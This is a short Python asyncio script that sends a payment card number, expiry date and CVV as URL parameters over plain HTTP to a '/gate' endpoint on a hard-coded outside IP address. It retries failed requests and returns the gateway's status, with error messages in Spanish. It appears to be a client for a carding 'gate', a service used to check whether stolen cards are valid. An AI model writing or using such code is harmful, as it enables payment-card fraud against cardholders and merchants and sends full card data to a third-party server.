import asyncio
import aiohttp

async def mn(cc, mes, ano, cvv):
    async with aiohttp.ClientSession() as session: 
        url = f"http://46.202.178.88:5000/gate?gate=mn&cc={cc}&mes={mes}&ano={ano}&cvv={cvv}"
        for attempt in range(3):
            try:
                async with session.get(url) as response:
                    if response.status == 200:
                        data = await response.json()
                        print(data)
                        if isinstance(data, list): 
                            status, response = data
                        else:
                            status = 'Error ⚠️'
                            response = 'Api Error'
                        return status, response 
                    else:
                        status = 'Error ⚠️'
                        response = 'Porfavor Notifique al owner'
            except Exception as e:
                if attempt < 2:  
                    continue
                else: 
                    status = 'Error ⚠️'
                    response = 'Api Error'
        return status, response
                    